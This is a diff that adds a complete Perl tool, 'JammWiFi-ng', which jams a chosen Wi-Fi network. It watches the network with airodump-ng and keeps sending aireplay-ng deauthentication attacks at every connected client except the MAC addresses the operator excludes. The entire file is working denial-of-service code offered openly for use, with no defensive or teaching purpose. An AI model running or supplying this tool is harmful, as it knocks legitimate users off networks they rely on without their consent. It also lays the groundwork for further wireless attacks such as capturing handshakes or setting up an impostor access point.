@@ -1,0 +1,250 @@
+#!/usr/bin/perl
+#	JammWiFi-ng - a script for deauthenticating all clients on a network using aireplay deauth attack
+#    Copyright (C) 2011 Ettore Di Giacinto <mailto:mudler@dark-lab.net>
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#   You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+use Getopt::Long;
+use Data::Dumper;
+use XML::TreeBuilder;
+use threads;
+
+my $PROG="JammWiFi-ng";
+my $VERSION="0.1";
+system("clear");
+print "
+########################################################################
+###########################################################".$PROG." v".$VERSION."
+#######################################################################
+						By mudler
+						http://hacklab-42.dark-lab.net\n";
+
+
+my $result = GetOptions(
+	"dev=s"     => \$dev,
+	"channel=s" => \$channel,
+	"target=s"  => \$target,
+	"cycle=s"  => \$cicle,
+	"deauth=s"  => \$deauth,
+	"direct" => \$direct,
+	"help" => \$help,
+	"exclude=s{,}"=>\@EXCLUDED_MAC,
+	"xterm" => \$xterm,
+	"verbose" => \$verbose
+);
+
+if(!defined($dev) || !defined($channel) || !defined($target) || defined($help)){
+	usage();
+	exit();
+}
+$cicle = 10 if !defined($cicle);
+$deauth = 10 if !defined($deauth);
+
+my $file;
+my $tree = XML::TreeBuilder->new();
+
+print "[!] Starting jamming on ".$dev." cycling every ".$cicle." for ".$deauth." deauths\n";
+print "[!] Kicking out all clients...\n";
+if(defined($verbose)){
+	print "[!] Verbose mode on!\n";
+	$verbose=1;
+} else {
+	$verbose=0;
+}
+if(defined($direct)){
+	print "[!] Direct Jamming mode on!\n";
+	$direct=1;
+} else {
+	$direct=0;
+}
+if(defined($xterm)){
+	print "[!] using xterm \n";
+	$xterm=1;
+} else {
+	$xterm=0;
+}
+system( "aireplay-ng --deauth ".$deauth." -a " . $target . " " . $dev );
+foreach my $excluded(@EXCLUDED_MAC){
+	print "[EXCLUDED] ".$excluded." \n";
+}
+system("rm -rfv *.netxml");
+
+print "[!] Kicking out all clients...\n";
+$airodump = threads->create( 'airodump', $dev, $channel,$deauth,$xterm );
+my %threads;
+while ( sleep $cicle ) {
+	@XML = <*.netxml>;
+	foreach my $file (@XML) {
+		$tree->parse_file($file);
+		foreach my $NETWORK ( $tree->find_by_tag_name('wireless-network') ) {
+			if ( $NETWORK->find_by_tag_name('BSSID')->as_text eq $target ) {
+				if ($verbose==1){
+					system("clear");
+				}
+				my $clients=0;
+				my $threads_running=0;
+				my $threads_joinable=0;
+				if ( defined $NETWORK->find_by_tag_name('wireless-client') ) {
+					foreach my $CLIENT (
+						$NETWORK->find_by_tag_name('wireless-client') )
+					{
+						$KILL =
+						  $CLIENT->find_by_tag_name('client-mac')->as_text;
+						  my $is_excluded=0;
+						foreach my $special (@EXCLUDED_MAC) {
+							if ( $special eq $KILL ) {
+								$is_excluded=1;
+								print "[!] " . $KILL
+								  . " is on EXCLUDED_MAC list!\n";
+							}
+						}
+						if($is_excluded==0){
+							
+							
+								my @running = threads->list();
+								$stop = 0;
+								foreach my $thr (@running) {
+									if ( $thr->is_running()
+										and ( $threads{ $thr->tid() } eq $KILL )
+									  )
+									{
+										$threads_running++;
+										#print "[RUNNING] #"
+										#  . $thr->tid()
+										#  . " Already on "
+										#  . $KILL . " !\n";
+										$stop = 1;
+
+									}
+									if ( $thr->is_joinable() ) {
+										$threads_joinable++;
+										print "[DEAD] #"
+										  . $thr->tid()
+										  . " is not running anymore... !\n";
+
+										delete $threads{ $thr->tid() };
+										$thr->join();
+
+									}
+								}
+								if ( $stop == 0 ) {
+									$tr = threads->create( 'jamming', $KILL,
+										$target, $dev,$deauth,$direct,$verbose );
+									$threads{ $tr->tid() } = $KILL;
+									print "[STARTED] #"
+									  . $tr->tid() . " on "
+									  . $KILL . " !\n";
+
+								}
+
+							
+						}
+						$clients++;
+					}
+				
+					
+
+				}
+				print "[NETWORK] " . $target . " found!\n";
+				print "[NETWORK] " . $target . " has ".$clients." clients associated!\n";
+				print "[THREADS] " . $threads_running . " threads running, ".$threads_joinable." joined\n";
+
+			}
+		}
+	}
+}
+
+sub airodump {
+	$dev     = $_[0];
+	$channel = $_[1];
+	$deauth=$_[2];
+	$xterm=$_[3];
+	
+	if($xterm==1){
+	system(
+"xterm -fn fixed -geom -0-0 -title 'Scanning specified channel' -e 'airodump-ng -c "
+		  . $channel
+		  . " -w airodumpoutput "
+		  . $dev
+		  . " --output-format netxml -a' 2>/dev/null" );
+		  threads->yeld();
+	  } else {
+		  `airodump-ng -a -c $channel -w airodumpoutput $dev --output-format netxml 2>/dev/null`;
+		  threads->yeld();
+		  
+	  } 
+	  
+	  #threads->exit();
+
+}
+
+sub jamming {
+	my($KILL,$target,$dev,$deauth,$direct,$verbose)=@_;
+	if($verbose==1){
+		if($direct==1){
+			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev." direct mode\n";
+			system( "aireplay-ng --deauth " 
+		  . $deauth . " -a " 
+		  . $target . " -c " 
+		  . $KILL . " "
+		  . $dev );
+		  threads->yeld();
+		} else {
+			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev."\n";
+		  	system( "aireplay-ng --deauth " 
+		  . $deauth . " -a " 
+		  . $KILL . " "
+		  . $dev );
+		  threads->yeld();
+		}
+	} else {
+		
+		if($direct==1){
+			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev." direct mode\n";
+			`aireplay-ng --deauth $deauth -a $target -c $KILL $dev`;
+			threads->yeld();
+		} else {
+			print "[ATTACKING] ".$KILL." with ".$deauth." on ".$dev."\n";
+			`aireplay-ng --deauth $deauth -a $KILL $dev`;	
+			threads->yeld();
+		}
+		print "[FINISHED] Attacking ".$KILL."\n";
+		
+	}
+
+#system("xterm -fn fixed -geom -0-0 -title 'Jamming ".$KILL."' -e 'aireplay-ng --deauth 30 -a ".$target." -c ".$KILL." ".$dev."'");
+		#threads->exit();
+}
+
+sub usage(){
+	
+	print "
+	".$PROG." v".$VERSION."
+	".$PROG." Performs an wifi jammer attack, that means that on the specified 
+	access point only you and ony others specified MAC address will remain here.
+		
+	".$0." --dev [DEVICE] --target [TARGET] --channel [CHANNEL] --cicle [CICLE] --deauth [DEAUTH] --exclude [MAC_1] [MAC_2] [...] --verbose --direct
+	
+	Where:
+	[DEVICE] is your device addres (monitor mode on)
+	[TARGET] is the Access Point mac address
+	[CHANNEL] is the channel where the Access point and the clients are...
+	[CICLE] Cicle time for checking new clients
+	[DEAUTH] is the deauth count of aireplay
+	[MAC_1] [MAC_2] [...] Mac addresses to exclude from the deauth process
+	option --direct it's using the direct client deauth on aireplay (-c option)
+
+	\n";
+	
+}
